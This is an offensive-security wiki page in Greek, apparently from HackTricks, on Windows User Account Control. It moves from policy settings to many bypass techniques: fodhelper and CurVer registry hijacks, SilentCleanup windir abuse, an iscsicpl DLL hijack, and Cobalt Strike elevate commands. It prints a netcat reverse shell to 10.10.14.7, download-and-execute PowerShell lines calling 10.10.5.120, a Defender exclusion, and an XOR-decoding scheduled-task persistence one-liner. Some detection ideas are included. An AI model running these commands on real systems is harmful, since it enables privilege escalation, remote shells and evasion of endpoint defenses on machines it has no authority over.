# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **prompt συναίνεσης για ενέργειες με elevated δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν δυνητικά να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες εκτελούνται πάντα **στο security context ενός non-administrator account**, εκτός εάν ένας administrator εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να αποκτήσουν πρόσβαση επιπέδου administrator στο σύστημα για να εκτελεστούν. Είναι μια δυνατότητα ευκολίας που προστατεύει τους administrators από μη επιθυμητές αλλαγές, αλλά δεν θεωρείται security boundary.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργό, σε έναν administrator user παρέχονται 2 tokens: ένα standard user token, για την εκτέλεση κανονικών ενεργειών με medium integrity, και ένα με τα admin privileges.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) αναλύει σε μεγάλο βάθος τον τρόπο λειτουργίας του UAC και περιλαμβάνει τη διαδικασία logon, το user experience και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι administrators μπορούν να χρησιμοποιήσουν security policies για να διαμορφώσουν τον τρόπο λειτουργίας του UAC ειδικά για τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να το διαμορφώσουν και να το προωθήσουν μέσω Group Policy Objects (GPO) σε ένα Active Directory domain environment. Οι διάφορες ρυθμίσεις αναλύονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 Group Policy settings που μπορούν να οριστούν για το UAC. Ο ακόλουθος πίνακας παρέχει επιπλέον λεπτομέρειες:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Οι **local security policies** ("secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένες από προεπιλογή ώστε να **εμποδίζουν non-admin users από την εγκατάσταση software**. Αυτό σημαίνει ότι, ακόμη και αν ένας non-admin user μπορεί να κατεβάσει τον installer του software σας, δεν θα μπορεί να τον εκτελέσει χωρίς ένα admin account.

### Registry Keys to Force UAC to Ask for Elevation

Ως standard user χωρίς admin rights, μπορείτε να διασφαλίσετε ότι ο "standard" account θα **λαμβάνει prompt για credentials από το UAC** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια απαιτεί την τροποποίηση συγκεκριμένων **registry keys**, για τα οποία χρειάζεστε admin permissions, εκτός εάν υπάρχει **UAC bypass** ή ο attacker είναι ήδη συνδεδεμένος ως admin.

Ακόμη και αν ο user ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές υποχρεώνουν τον user να **εισάγει ξανά τα account credentials** του προκειμένου να εκτελέσει administrative actions.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν έχετε ήδη ένα elevated token, ένα UAC bypass ή μια misconfiguration που σας επιτρέπει να αλλάξετε αυτά τα keys· διαφορετικά, το ίδιο το registry write μπλοκάρεται.**

Τα registry keys και entries που πρέπει να αλλάξετε είναι τα ακόλουθα (με τις default values σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Local Security Policy. Μετά την αλλαγή, οι administrative operations ζητούν από τον user να εισαγάγει ξανά τα credentials του.

### Note

**Το User Account Control δεν αποτελεί security boundary.** Επομένως, οι standard users δεν μπορούν να ξεφύγουν από τους accounts τους και να αποκτήσουν administrator rights χωρίς ένα local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Το Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει την πρόσβαση διεργασιών υψηλού επιπέδου ακεραιότητας (όπως τα web browsers) σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως ο φάκελος προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται με την εκτέλεση του browser με token χαμηλού επιπέδου ακεραιότητας. Όταν ο browser προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλού επιπέδου ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η δυνατότητα βοηθά στην αποτροπή επιθέσεων remote code execution από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα privileges του χρήστη. Τα privileges ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, τα οποία χρησιμοποιούνται για την αυθεντικοποίηση του χρήστη στον υπολογιστή και σε resources του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για σκοπούς testing. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει το password στο registry.

Ορίστε τα παρακάτω keys χρησιμοποιώντας τον Registry Editor ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε την κανονική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε graphical access στο victim, το UAC bypass είναι straightforward, καθώς μπορείτε απλώς να κάνετε κλικ στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass απαιτείται στην εξής περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε context με medium integrity και ο χρήστης σας ανήκει στο administrators group**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να γίνει bypass του UAC αν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always), σε σχέση με οποιοδήποτε από τα άλλα επίπεδα (Default).**

### Fast triage from a medium-integrity shell

Πριν επιχειρήσετε bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό σενάριο και αντιστοιχίστε το build του host με γνωστές μεθόδους που λειτουργούν:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Πρακτικές σημειώσεις:
- Αν το `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας high integrity.
- Τα `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` αυξάνει τον βαθμό δυσκολίας, αλλά θα πρέπει και πάλι να δοκιμάζετε το ακριβές build αντί να υποθέτετε αποτυχία: το UACME εξακολουθεί να παρακολουθεί ορισμένες μεθόδους `AlwaysNotify compatible` σε σύγχρονα Windows builds.<sup>[[3]](#references)</sup>

### Το UAC απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**), μπορείτε να **εκτελέσετε ένα reverse shell με admin privileges** (high integrity level) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass με token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** βασικό UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με έναν χρήστη που ανήκει στην ομάδα Administrators, μπορείτε να κάνετε **mount το C$** share μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο file system** (ακόμα και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Οι τεχνικές του Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφαλείας
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Ανυψωμένες διεπαφές COM (`ICMLuaUtil` / `CMSTPLUA`)

Τα auto-elevated αντικείμενα COM παραμένουν μια πρακτική επιφάνεια UAC σε σύγχρονα builds. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στα τρέχοντα Windows branches, ενώ τα offensive εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια διεργασία στο interactive desktop, εκτέλεση 64-bit και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια διεργασία **64-bit** στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή ένα child process του).
- Αν ένα raw shell αποτύχει, δοκιμάστε ξανά από ένα BOF / UACME implementation αντί για ένα αφελές wrapper του `CreateProcess`.
- Αναμένετε η εκτέλεση του child process να πραγματοποιηθεί σε μια **ξεχωριστή elevated διεργασία**· πολλά BOFs δεν κάνουν elevate το τρέχον beacon in-place.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits για UAC bypass

Το [**UACME** ](https://github.com/hfiref0x/UACME)είναι μια **συλλογή** αρκετών exploits για UAC bypass. Σημειώστε ότι θα χρειαστεί να **κάνετε compile το UACME χρησιμοποιώντας visual studio ή msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά executables (όπως το `Source\Akagi\outout\x64\Debug\Akagi.exe`)· θα χρειαστεί να γνωρίζετε **ποιο χρειάζεστε.**\
Θα πρέπει να είστε **προσεκτικοί**, επειδή ορισμένα bypasses θα **ενεργοποιήσουν άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.<sup>[[3]](#references)</sup>

Το UACME διαθέτει την **build version από την οποία άρχισε να λειτουργεί κάθε technique**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια technique που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας τη [σελίδα](https://en.wikipedia.org/wiki/Windows_10_version_history) αυτή, βρίσκετε το Windows release `1607` από τις build versions.

Μια πρακτική ροή εργασίας είναι να **αξιολογήσετε πρώτα το host build** και, μόνο στη συνέχεια, να εκτελέσετε την αντίστοιχη μέθοδο:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- Το `WinPwnage` συγκρίνει γρήγορα το local build με τις γνωστές μεθόδους UAC, κάτι που είναι χρήσιμο για τον γρήγορο αποκλεισμό μη λειτουργικών PoCs.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για την αντιστοίχιση ενός bypass με ένα συγκεκριμένο build. Οι πρόσφατες εκδόσεις πρόσθεσαν νέες μεθόδους και επανέλεγξαν τις υπάρχουσες μεθόδους έναντι των **Windows 11 25H2**, επομένως ελέγξτε ξανά το README/τα release notes πριν υποθέσετε ότι ένα παλιό blog post εξακολουθεί να εφαρμόζεται χωρίς αλλαγές.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Το αξιόπιστο binary `fodhelper.exe` εκτελείται αυτόματα με elevated privileges στα σύγχρονα Windows. Κατά την εκκίνησή του, αναζητά το παρακάτω per-user registry path χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (ο user ανήκει στους Administrators) να εκκινήσει μια διεργασία High Integrity χωρίς προτροπή UAC.

Registry path που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι το προεπιλεγμένο/ελαστικό (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit διεργασία σε 64-bit Windows.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Αποφύγετε τα UIs που εμφανίζουν prompts για stealth.

#### Παραλλαγή CurVer/extension hijack (μόνο HKCU)

Πρόσφατα δείγματα που κάνουν abuse του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και αντ' αυτού κάνουν **redirect το `ms-settings` ProgID** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον handler υπό το `HKCU`, επομένως δεν απαιτείται admin token για την τοποθέτηση των keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει elevated privileges, το malware συνήθως **απενεργοποιεί τα μελλοντικά prompts** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0`, και στη συνέχεια εκτελεί πρόσθετο defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και δημιουργεί ξανά persistence ώστε να εκτελείται με high integrity. Μια τυπική persistence task αποθηκεύει ένα **XOR-encrypted PowerShell script** στον δίσκο και το αποκωδικοποιεί/εκτελεί in-memory κάθε ώρα:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το dropper και να αφήνει μόνο τα staged payloads, επομένως η ανίχνευση βασίζεται στην παρακολούθηση του **hijack του `CurVer`**, της παραποίησης του `ConsentPromptBehaviorAdmin`, της δημιουργίας εξαίρεσης στο Defender ή προγραμματισμένων εργασιών που κάνουν in-memory decrypt σε PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass μέσω της εργασίας `SilentCleanup` (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα δικαιώματα και επεκτείνει το `%windir%` από το περιβάλλον του χρήστη. Αν ελέγχετε το `HKCU\Environment\windir`, μπορείτε να ανακατευθύνετε αυτή την επέκταση σε μια αυθαίρετη εντολή και να αποκτήσετε υψηλή ακεραιότητα χωρίς διάλογο συναίνεσης.<sup>[[8]](#references)</sup> Αυτή η μέθοδος εξακολουθεί να αξίζει να δοκιμάζεται σε πρόσφατα builds, επειδή το UACME διατηρεί την τεχνική ενεργή και η πρόσφατη παρακολούθηση ζητημάτων δείχνει ότι τα Windows 11 24H2 ενδέχεται να απαιτούν μόνο μικρές προσαρμογές στα εισαγωγικά.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Αν η εργασία συμπεριλαμβάνει το path σε αυτό το build, επανέλαβέ την με το payload να τελειώνει σε quote (για παράδειγμα `cmd.exe"`). Να καθαρίζεις πάντα το `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερα UAC bypass

Πολλά κλασικά UAC bypasses που κάνουν abuse σε UI flows, COM objects ή desktop interaction απαιτούν μια **πλήρη interactive session** με το victim· ένα συνηθισμένο shell μέσω `nc.exe` ή μια υπηρεσία που εκτελείται στο **Session 0** συχνά δεν επαρκεί.

Μπορείς συχνά να το解决σεις χρησιμοποιώντας μια **meterpreter** session. Κάνε migrate σε μια **process** που έχει την τιμή **Session** ίση με **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχεις πρόσβαση σε **GUI, μπορείς απλώς να αποδεχτείς το UAC prompt** όταν εμφανιστεί· στην πραγματικότητα δεν χρειάζεσαι technical bypass. Επομένως, η απόκτηση μιας GUI session συχνά αρκεί για να παρακάμψεις την πρακτική δυσκολία που προσθέτει το UAC.

Επιπλέον, αν αποκτήσεις μια GUI session που χρησιμοποιούσε κάποιος (ενδεχομένως μέσω RDP), **ορισμένα εργαλεία θα εκτελούνται ως administrator**, από τα οποία θα μπορούσες να **τρέξεις** ένα **cmd**, για παράδειγμα, **ως admin**, απευθείας χωρίς να εμφανιστεί ξανά UAC prompt, όπως στο [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδες brute-force UAC bypass

Αν δεν σε ενδιαφέρει να είσαι noisy, μπορείς πάντα να **τρέξεις κάτι όπως** το [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), το οποίο **ζητά elevation permissions μέχρι ο user να το αποδεχτεί**.

### Το δικό σου bypass - Basic UAC bypass methodology

Αν ρίξεις μια ματιά στο **UACME**, θα παρατηρήσεις ότι **πολλά UAC bypasses κάνουν abuse σε DLL hijacking** (συχνά κάνοντας ένα elevated binary να φορτώσει ένα attacker-controlled DLL από ένα writable path). [Διάβασε αυτό για να μάθεις πώς να εντοπίζεις μια ευπάθεια DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρες ένα binary που κάνει **autoelevate** (έλεγξε ότι, όταν εκτελείται, τρέχει σε high integrity level).
2. Με το procmon, βρες events "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψεις** το DLL μέσα σε ορισμένα **protected paths** (όπως το C:\Windows\System32), όπου δεν έχεις δικαιώματα εγγραφής. Μπορείς να το παρακάμψεις χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Επιτρέπει την εξαγωγή των περιεχομένων ενός CAB file μέσα σε protected paths (επειδή αυτό το tool εκτελείται από high integrity level).
2. **IFileOperation**: Windows 10.
4. Ετοίμασε ένα **script** για να αντιγράψεις το DLL μέσα στο protected path και να εκτελέσεις το ευάλωτο και autoelevated binary.

### Μια άλλη τεχνική UAC bypass

Συνίσταται στο να παρακολουθείς αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/path** ενός **binary** ή **command** που πρόκειται να **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + DLL hijack μέσω user `PATH`

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει abuse ώστε να φορτώσει το `iscsiexe.dll` μέσω της σειράς αναζήτησης. Αν μπορείς να τοποθετήσεις ένα κακόβουλο `iscsiexe.dll` μέσα σε έναν **user-writable** φάκελο και στη συνέχεια να τροποποιήσεις το `PATH` του τρέχοντος user (για παράδειγμα μέσω του `HKCU\Environment\Path`), ώστε να γίνεται αναζήτηση σε αυτόν τον φάκελο, τα Windows ενδέχεται να φορτώσουν το attacker DLL μέσα στη διαδικασία του elevated `iscsicpl.exe` **χωρίς να εμφανίσουν UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο τρέχων user ανήκει στους **Administrators**, αλλά εκτελείται σε **Medium Integrity** λόγω του UAC.
- Το αντίγραφο στο **SysWOW64** είναι το σχετικό με αυτό το bypass. Αντιμετώπισε το αντίγραφο στο **System32** ως ξεχωριστό binary και επαλήθευσε τη συμπεριφορά του ανεξάρτητα.
- Το primitive είναι ένας συνδυασμός **auto-elevation** και **DLL search-order hijacking**, επομένως το ίδιο workflow του ProcMon που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμο για την επαλήθευση του missing DLL load.

Ελάχιστη ροή:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες για Detection:
- Δημιουργήστε alert για `reg add` / εγγραφές στο registry προς `HKCU\Environment\Path` που ακολουθούνται άμεσα από την εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Αναζητήστε το `iscsiexe.dll` σε **τοποθεσίες που ελέγχονται από τον χρήστη**, όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Συσχετίστε τις εκκινήσεις του `iscsicpl.exe` με μη αναμενόμενες child processes ή DLL loads εκτός των κανονικών Windows directories.

### Νεότερη έρευνα που αξίζει να ελεγχθεί ξεχωριστά

